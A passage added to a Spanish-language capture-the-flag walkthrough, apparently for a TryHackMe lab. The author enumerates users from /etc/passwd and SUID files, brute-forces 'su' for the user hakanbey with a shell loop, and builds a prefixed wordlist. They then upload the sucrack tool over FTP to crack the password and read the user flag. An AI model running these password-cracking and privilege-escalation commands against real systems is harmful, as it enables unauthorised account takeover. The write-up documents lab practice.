@@ -265,3 +265,176 @@ xmlrpc.php
 cat wwe3bbfla4g.txt
 THM{34**********************}
 
+Hago sudo -l y www-data@ubuntu:/home$ find / -perm -4000 2>/dev/null
+
+Pero no me dan salida. Linpeas no me saca nada relevante.
+
+cat /etc/passwd | grep -v nologin | grep -v false
+root:x:0:0:root:/root:/bin/bash
+sync:x:4:65534:sync:/bin:/bin/sync
+hakanbey:x:1000:1000:hakanbey:/home/hakanbey:/bin/bash
+hakanftp:x:1001:1001:,,,:/var/www/subdomain:/bin/bash
+
+No encuentro nada, por donde seguir.
+Ni cronjobs ni servicios.
+
+Pruebo fuerza bruta.
+
+www-data@ubuntu:/tmp$ while read pwd; do
+    echo "Probando: $pwd"
+    echo "$pwd" | su - hakanbey -c "whoami" 2>/dev/null | grep -q "hakanbey" && echo "✅ ¡FOUND: $pwd!" && break
+done < /tmp/passwords.txtwhile read pwd; do
+>     echo "Probando: $pwd"
+<-q "hakanbey" && echo "✅ ¡FOUND: $pwd!" && break
+> 
+done < /tmp/passwords.txt
+Probando: hakanbey
+Probando: hakan
+Probando: hakkan
+Probando: h4k4nb3y
+Probando: hakan123
+Probando: password
+Probando: 123456
+Probando: admin
+Probando: root
+Probando: toor
+Probando: ubuntu
+Probando: hakanbey2026
+Probando: 2026
+Probando: letmein
+Probando: welcome
+Probando: h4k4n
+Probando: Hakan.2026
+Probando: P@ssw0rd
+Probando: 123adanacrack
+Probando: 123adanaantinwar
+Probando: 12345
+Probando: phpmyadmin
+Probando: adana
+Probando: antinwar
+
+Solo tengo dos puertos, no puedo hacer fuerza bruta a ssh.
+
+Puedo seguir probando con wordlists. Rockyou no me da resultado.
+
+Dado que puedo seguir probando contraseñas, y no es muy grande la lista, pruebo con diversas modificaciones. Doblar palabras y usar prefijos y sufijos de la misma.
+Tras intentarlo un rato, vuelvo a leer lo que llevo de walkthrough.
+
+Tengo 2 contraseñas con prefijo 123adana. Puede que este sea el prefijo.
+
+Subo la wordlist completa por ftp.
+
+-rw-------  1 hakanftp hakanftp 403891 Sep  7 09:16 wordlist.txt.1
+
+Y le doy permisos.
+
+ftp> chmod 777 wordlist.txt.1
+200 SITE CHMOD command ok.
+
+Creo la nueva wordlist.
+
+www-data@ubuntu:/var/www/subdomain$ # Crear la nueva wordlist con prefijo
+while read pwd; do
+    echo "123adana$pwd"
+done < wordlist.txt.1 > wordlist_123adana.txt
+
+# Verificar cuántas líneas tiene
+echo "📊 Líneas originales: $(wc -l < wordlist.txt.1)"
+echo "📊 Líneas generadas: $(wc -l < wordlist_123adana.txt)"
+
+# Ver las primeras líneas para confirmar
+head -5 wordlist_123adana.txt# Crear la nueva wordlist con prefijo
+www-data@ubuntu:/var/www/subdomain$ while read pwd; do
+>     echo "123adana$pwd"
+> done < wordlist.txt.1 > wordlist_123adana.txt
+
+head -5 wordlist_123adana.txt
+www-data@ubuntu:/var/www/subdomain$ 
+www-data@ubuntu:/var/www/subdomain$ # Verificar cuántas líneas tiene
+<📊 Líneas originales: $(wc -l < wordlist.txt.1)"
+📊 Líneas originales: 50000
+<íneas generadas: $(wc -l < wordlist_123adana.txt)"
+📊 Líneas generadas: 50000
+www-data@ubuntu:/var/www/subdomain$ 
+www-data@ubuntu:/var/www/subdomain$ # Ver las primeras líneas para confirmar
+www-data@ubuntu:/var/www/subdomain$ head -5 wordlist_123adana.txt
+123adana123456
+123adana12345
+123adana123456789
+123adanapassword
+123adanailoveyou
+
+El script no me da resultado, asique instalo sucrack y paso el binario por ftp.
+
+229 Entering Extended Passive Mode (|||54993|)
+150 Ok to send data.
+100% |***************************************************************************| 30952      234.27 MiB/s    00:00 ETA
+226 Transfer complete.
+30952 bytes sent in 00:00 (322.43 KiB/s)
+ftp> chmod 777 sucrack
+200 SITE CHMOD command ok.
+ftp> 
+
+
+www-data@ubuntu:/var/www/subdomain$ ./sucrack -u hakanbey -w 8 -s 10 wordlist_123adana.txt
+<ucrack -u hakanbey -w 8 -s 10 wordlist_123adana.txt
+     time elapsed:    00:00:00
+   time remaining:    00:00:00
+         progress:    0.04% []
+     user account:    hakanbey
+
+ __dictionary:_______________________
+        file size:    803884
+       bytes read:    354
+       words read:    24
+ word buffer size:    16
+    time/word add:    0.0000
+         rewriter:    disabled
+
+ __worker:___________________________
+
+Y ejecuto sucrack con la nueva wordlist.
+
+Justo cuando iba a cancelar el comando (El tiempo restante es de 3 días) me saca la contraseña.
+
+
+ __worker:___________________________
+           worker:    8
+         attempts:    2369
+  attempts/worker:    296
+  seconds/attempt:    1.988181
+     attempts/sec:    4.023779
+  overhead/worker:    0.000000
+
+     time elapsed:    00:10:00
+   time remaining:    3 days 03:46:42
+         progress:    4.49% []
+     user account:    hakanbey
+
+ __dictionary:_______________________
+        file size:    803884
+       bytes read:    36124
+       words read:    2435
+ word buffer size:    16
+    time/word add:    0.2464
+         rewriter:    disabled
+
+ __worker:___________________________
+           worker:    8
+         attempts:    2411
+  attempts/worker:    301
+  seconds/attempt:    1.987142
+     attempts/sec:    4.025882
+  overhead/worker:    0.000000
+
+password is: 123adanasubaru
+www-data@ubuntu:/var/www/subdomain$ 
+
+En su home encuentro la flag de user.
+
+hakanbey@ubuntu:/var/www/subdomain$ cd
+hakanbey@ubuntu:~$ ls
+Desktop    Downloads  Pictures  Templates  Videos
+Documents  Music      Public    user.txt   website
+hakanbey@ubuntu:~$ cat user.txt	
+THM{******************************}
